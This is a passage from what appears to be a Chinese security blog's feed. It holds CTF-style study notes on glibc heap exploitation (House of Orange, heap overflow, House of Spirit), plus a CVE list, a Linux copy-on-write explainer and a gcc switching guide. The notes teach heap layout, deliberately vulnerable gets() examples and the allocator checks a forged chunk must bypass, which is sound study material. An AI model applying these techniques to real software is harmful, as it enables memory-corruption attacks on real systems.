class="line">//经过扩展的堆</span><br><span class="line">0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]</span><br></pre></td></tr></table></figure><p>我们的申请被分配到 0x623010 的位置，同时原有的堆被置入 unsorted bin</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x602020, bk=0x602020</span><br><span class="line"> →   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>因为 unsorted bin 中存在块，所以我们下次的分配会切割这个块</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> malloc(0x60);</span><br><span class="line"> 0x602030</span><br><span class="line"></span><br><span class="line">[+] unsorted_bins[0]: fw=0x602090, bk=0x602090</span><br><span class="line"> →   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure><p>可以看到分配的内存是从 unsorted bin 中切割的，内存布局如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208 &lt;== 未被清零的unsorted bin链表</span><br><span class="line">0x602040:   0x0000000000602020  0x0000000000602020</span><br><span class="line">0x602050:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602060:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602070:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602080:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602090:   0x0000000000000000  0x0000000000001f51 &lt;== 切割剩下的新unsorted bin</span><br><span class="line">0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x6020b0:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="">CISCN 2020 nofree</a></p>]]></content>
    
    
    <summary type="html">House of Orange 学习</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Pwn" scheme="http://lantern.cool/categories/Note/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://lantern.cool/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Heap Overflow</title>
    <link href="http://lantern.cool/note-pwn-heap-overflow/"/>
    <id>http://lantern.cool/note-pwn-heap-overflow/</id>
    <published>2020-08-18T17:46:55.000Z</published>
    <updated>2020-08-18T17:46:59.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习自<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heapoverflow_basic-zh/">CTF Wiki Heap Overflow</a>, 根据学习情况略有修改</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数(<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>)，因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>堆溢出前提:</p><ul><li>程序向堆上写入数据</li><li>写入的数据大小没有良好地控制</li></ul><p>对于攻击者来说，堆溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程</p><p>堆溢出是一种特定的缓冲区溢出（还有栈溢出， bss 段溢出等)。但是其与栈溢出所不同的是，堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p><ol><li>覆盖与其<strong>物理相邻的下一个 chunk</strong> 的内容<ol><li>prev_size</li><li>size, 主要有三个比特位, 以及该堆块真正的大小<ol><li>NON_MAIN_ARENA</li><li>IS_MAPPED</li><li>PREV_INUSE</li><li>the true chunk size</li></ol></li><li>chunk content, 从而改变程序固有执行流</li></ol></li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流</li></ol><h2 id="基本示例"><a href="#基本示例" class="headerlink" title="基本示例"></a>基本示例</h2><p>举个简单的栗子:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中 (实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555756250: 0x0000000000000000      0x0000000000000021 &lt;=== chunk</span><br><span class="line">0x555555756260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756270: 0x0000000000000000      0x0000000000020d91 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>写入 ‘A’ * 100</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555756250: 0x0000000000000000      0x0000000000000021 &lt;=== chunk</span><br><span class="line">0x555555756260: 0x4141414141414141      0x4141414141414141</span><br><span class="line">0x555555756270: 0x4141414141414141      0x4141414141414141 &lt;=== top chunk</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>堆溢出中比较重要的几个步骤:</p><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 <strong>calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">ptr = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *chunk, *chunk1;</span><br><span class="line">    chunk = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk1 = <span class="built_in">realloc</span>(chunk, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>realloc 会根据不同情况进行不同操作</p><ul><li>当 realloc(ptr, size) 的 size 不等于 ptr 的 size 时<ul><li>如果申请 size &gt; 原来 size<ul><li>如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</li><li>如果 chunk 与 top chunk 不相邻，相当于 free(ptr), malloc(new_size)</li></ul></li><li>如果申请 size &lt; 原来 size<ul><li>如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</li><li>如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</li></ul></li></ul></li><li>当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</li><li>realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里</p><p>常见的危险函数如下:</p><ul><li>输入<ul><li>gets, 直接读取一行, 忽略<code>\x00</code></li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy, 字符串复制, 遇到<code>\x00</code>停止</li><li>strcat, 字符串拼接, 遇到<code>\x00</code>停止</li><li>bcopy</li></ul></li></ul><h3 id="确定填充长度"><a href="#确定填充长度" class="headerlink" title="确定填充长度"></a>确定填充长度</h3><p>这一部分主要是计算<strong>我们开始写入的地址与我们所要覆盖的地址之间的距离</strong>。 一个常见的误区是 malloc 的参数等于实际分配堆块的大小，但是事实上 ptmalloc 分配出来的大小是对齐的。这个长度一般是字长的 2 倍，比如 32 位系统是 8 个字节，64 位系统是 16 个字节。但是对于不大于 2 倍字长的请求，malloc 会直接返回 2 倍字长的块也就是最小 chunk，比如 64 位系统执行malloc(0)会返回用户区域为 16 字节的块。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据系统的位数，malloc会分配8或16字节的用户空间</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555756250</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555756270</span><br><span class="line">Size: 0x20d91</span><br></pre></td></tr></table></figure><p>注意用户区域的大小不等于 chunk_hear.size，chunk_hear.size = 用户区域大小 + 2 * 字长</p><p>还有一点是之前所说的用户申请的内存大小会被修改，其有可能会使用与其物理相邻的下一个 chunk 的 prev_size 字段储存内容。回头再来看下之前的示例代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察如上代码，我们申请的 chunk 大小是 24 个字节。但是我们将其编译为 64 位可执行程序时，实际上分配的内存会是 16 个字节而不是 24 个</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x555555756250: 0x0000000000000000      0x0000000000000021 &lt;=== chunk</span><br><span class="line">0x555555756260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555756270: 0x0000000000000000      0x0000000000020d91 &lt;=== top chunk</span><br></pre></td></tr></table></figure><p>16 个字节的空间是如何装得下 24 个字节的内容呢？答案是借用了下一个块的 pre_size 域。我们可来看一下用户申请的内存大小与 glibc 中实际分配的内存大小之间的转换</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \</span></span><br><span class="line"><span class="meta">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>当 req=24 时，request2size(24)=32。而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节。<strong>实际上 ptmalloc 分配内存是以双字为基本单位，以 64 位系统为例，分配出来的空间是 16 的整数倍，即用户申请的 chunk 都是 16 字节对齐的</strong></p>]]></content>
    
    
    <summary type="html">Heap Overflow 学习</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="Pwn" scheme="http://lantern.cool/categories/Note/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://lantern.cool/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE Lists</title>
    <link href="http://lantern.cool/CVE-CVElists/"/>
    <id>http://lantern.cool/CVE-CVElists/</id>
    <published>2020-08-18T17:44:35.000Z</published>
    <updated>2020-08-18T17:44:32.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a href="https://lantern.cool/CVE-2016-5195">CVE-2016-5195</a></p><h2 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h2><p><a href="https://lantern.cool/CVE-d-link-dir-815/">D-Link DIR-815 路由器多次溢出漏洞分析</a></p>]]></content>
    
    
    <summary type="html">收集自己已复现的CVE</summary>
    
    
    
    <category term="CVE" scheme="http://lantern.cool/categories/CVE/"/>
    
    
    <category term="CVE" scheme="http://lantern.cool/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Copy-on-Write 机制</title>
    <link href="http://lantern.cool/note-binary-cow/"/>
    <id>http://lantern.cool/note-binary-cow/</id>
    <published>2020-08-18T15:00:45.000Z</published>
    <updated>2020-08-18T15:00:49.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>如果有多个调用者同时请求相同的资源(如内存或磁盘上的数据存储)， 他们会共同获得相同的指针指向相同的资源，<strong>直到某个调用者试图修改资源的内容</strong>时，系统才会<strong>真正复制一份专用副本（private copy）</strong>给该调用者，而其他调用者所见到的<strong>最初的资源仍然保持不变</strong>。这过程对其他的调用者都是透明的（transparently）。此作法主要的优点是如果调用者没有修改该资源，就不会有副本（private copy）被创建，因此多个调用者只是读取操作时可以共享同一份资源。</p><h2 id="fork-中的-COW"><a href="#fork-中的-COW" class="headerlink" title="fork 中的 COW"></a>fork 中的 COW</h2><p><a href="https://lantern.cool/note-binary-os-fork/">fork</a></p><p>fork 系统调用完成后，那么当父进程或者子进程尝试写共享物理页时，内核将拷贝物理页面</p><h3 id="写共享内存页"><a href="#写共享内存页" class="headerlink" title="写共享内存页"></a>写共享内存页</h3><p>当父进程 A 或子进程 B 任何一方对这些已共享的物理页面执行写操作时，都会产生页面出错异常（<code>page_fault int14</code>）中断，会将<code>flags &amp; FAULT_FLAG_WRITE</code>，然后通过<code>do_page_fault() -&gt; handle_mm_fault() -&gt; handle_pte_fault()</code>调用链解决这个异常。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">vm_fault_t</span> <span class="title">handle_pte_fault</span><span class="params">(struct vm_fault *vmf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (vmf-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line">            <span class="keyword">return</span> do_wp_page(vmf);</span><br><span class="line">        entry = pte_mkdirty(entry);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>pte_write</code> 会根据 <code>pte_flags(pte) &amp; _PAGE_RW</code> 判断页是否有写保护，这个标记是之前 fork 时 clear 掉的，所以会接着调用<code>do_wp_page</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This routine handles present pages, when users try to write</span></span><br><span class="line"><span class="comment"> * to a shared page. It is done by copying the page to a new address</span></span><br><span class="line"><span class="comment"> * and decrementing the shared-page counter for the old page.</span></span><br><span class="line"><span class="comment"> * 当用户试图写入共享页面时，此例程处理当前页面。将页面复制到一个新地址并减少旧页面的共享页面计数器。</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">vm_fault_t</span> <span class="title">do_wp_page</span><span class="params">(struct vm_fault *vmf)</span></span></span><br><span class="line"><span class="function">    __<span class="title">releases</span><span class="params">(vmf-&gt;ptl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> wp_page_copy(vmf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Handle the case of a page which we actually need to copy to a new page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Called with mmap_sem locked and the old page referenced, but</span></span><br><span class="line"><span class="comment"> * without the ptl held.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * High level logic flow:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - Allocate a page, copy the content of the old page to the new one.</span></span><br><span class="line"><span class="comment"> * - Handle book keeping and accounting - cgroups, mmu-notifiers, etc.</span></span><br><span class="line"><span class="comment"> * - Take the PTL. If the pte changed, bail out and release the allocated page</span></span><br><span class="line"><span class="comment"> * - If the pte is still the way we remember it, update the page table and all</span></span><br><span class="line"><span class="comment"> *   relevant references. This includes dropping the reference the page-table</span></span><br><span class="line"><span class="comment"> *   held to the old page, as well as updating the rmap.</span></span><br><span class="line"><span class="comment"> * - In any case, unlock the PTL and drop the reference we took to the old page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">vm_fault_t</span> <span class="title">wp_page_copy</span><span class="params">(struct vm_fault *vmf)</span></span></span><br></pre></td></tr></table></figure><p>wp_page_copy 函数主要就是分配一个页面，将旧页面的内容复制到新页面。</p><p>至此，父进程子进程各自拥有一块内容相同的物理页面。最后，从异常处理函数中返回时，CPU 就会重新执行刚才导致异常的写入操作指令，使进程继续执行下去。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.leosocy.top/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3Linux-COW%E5%86%99%E6%97%B6%E6%8B%B7%E8%B4%9D%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/">深入了解Linux-COW写时拷贝实现原理</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%AF%AB%E5%85%A5%E6%99%82%E8%A4%87%E8%A3%BD">维基百科 写入时复制</a></p>]]></content>
    
    
    <summary type="html">COW 机制学习</summary>
    
    
    
    <category term="Note" scheme="http://lantern.cool/categories/Note/"/>
    
    <category term="linux" scheme="http://lantern.cool/categories/Note/linux/"/>
    
    
    <category term="COW" scheme="http://lantern.cool/tags/COW/"/>
    
  </entry>
  
  <entry>
    <title>Linux环境多版本编译器(gcc)共存</title>
    <link href="http://lantern.cool/tool-linux-muti-gcc/"/>
    <id>http://lantern.cool/tool-linux-muti-gcc/</id>
    <published>2020-08-17T17:34:00.000Z</published>
    <updated>2020-08-17T17:34:03.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在linux开发环境下，有时候会遇到安装配置不同依赖包，而需要用到不同版本gcc或g++的情况并针对不同的编译需求进行版本的切换</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>环境: Ubuntu-18.04</li></ul><h3 id="下载安装欲新增版本的gcc工具"><a href="#下载安装欲新增版本的gcc工具" class="headerlink" title="下载安装欲新增版本的gcc工具"></a>下载安装欲新增版本的gcc工具</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gcc-4.8 g++-4.8</span><br></pre></td></tr></table></figure><h3 id="查看系统中已安装的gcc版本"><a href="#查看系统中已安装的gcc版本" class="headerlink" title="查看系统中已安装的gcc版本"></a>查看系统中已安装的gcc版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /usr/bin/gcc*</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  cve ls /usr/bin/gcc*</span><br><span class="line">/usr/bin/gcc      /usr/bin/gcc-ar      /usr/bin/gcc-nm      /usr/bin/gcc-ranlib</span><br><span class="line">/usr/bin/gcc-4.8  /usr/bin/gcc-ar-4.8  /usr/bin/gcc-nm-4.8  /usr/bin/gcc-ranlib-4.8</span><br><span class="line">/usr/bin/gcc-7    /usr/bin/gcc-ar-7    /usr/bin/gcc-nm-7    /usr/bin/gcc-ranlib-7</span><br></pre></td></tr></table></figure><h3 id="将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）"><a href="#将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）" class="headerlink" title="将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）"></a>将各个版本gcc加入gcc候选中，设置优先级（优先级可以不同版本设置相同，后面再通过配置来指定使用的版本）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 50</span><br><span class="line">sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50</span><br></pre></td></tr></table></figure><h3 id="选择要使用的gcc版本"><a href="#选择要使用的gcc版本" class="headerlink" title="选择要使用的gcc版本"></a>选择要使用的gcc版本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo update-alternatives --config gcc</span><br></pre></td></tr></table></figure><p>执行效果如下:<br><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20200817174235.png" alt="20200817174235"></p><ul><li>g++ 多版本共存与切换同理</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/u011195662/article/details/81070837">Linux环境下多版本编译器(gcc)共存</a></p>]]></content>
    
    
    <summary type="html">在linux编译内核的情况下，有时候会遇到安装配置不同依赖包，而需要用到不同版本gcc或g++的情况并针对不同的编译需求进行版本的切换</summary>
    
    
    
    <category term="Tool" scheme="http://lantern.cool/categories/Tool/"/>
    
    
    <category term="GCC" scheme="http://lantern.cool/tags/GCC/"/>
    
  </entry>
  
  <entry>
    <title>House of Spirit</title>
    <link href="http://lantern.cool/note-pwn-house-of-spirit/"/>
    <id>http://lantern.cool/note-pwn-house-of-spirit/</id>
    <published>2020-08-13T19:27:10.000Z</published>
    <updated>2020-08-13T19:27:13.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术, 算是一个组合型漏洞的利用</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为1, 因为 free 时, 如果是 mmap 的 chunk, 会单独处理</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</li><li>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</li></ul><p>至于为什么要绕过这些检测，可以参考 free 部分的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> __libc_free(<span class="keyword">void</span> *mem) &#123;</span><br><span class="line">    mstate ar_ptr;</span><br><span class="line">    mchunkptr p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*hook)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *) = atomic_forced_read (__free_hook);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    p = mem2chunk(mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*首先M标志位不能被置上才能绕过。release mmapped memory. */</span></span><br><span class="line">    <span class="keyword">if</span> (chunk_is_mmapped(p))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">                &amp;&amp; p-&gt;size</span><br><span class="line">                        &gt; mp_.mmap_threshold&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</span><br><span class="line">            mp_.mmap_threshold = chunksize(p);</span><br><span class="line">            mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">            LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">        munmap_chunk(p);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_int_free 函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">void</span></span><br><span class="line"> _int_free(mstate av, Void_t* mem)</span><br><span class="line"> &#123;</span><br><span class="line">   mchunkptr       p;           <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line">   INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">   mfastbinptr*    fb;          <span class="comment">/* associated fastbin */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">  p = mem2chunk(mem);</span><br><span class="line">  size = chunksize(p);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(av-&gt;max_fast)   <span 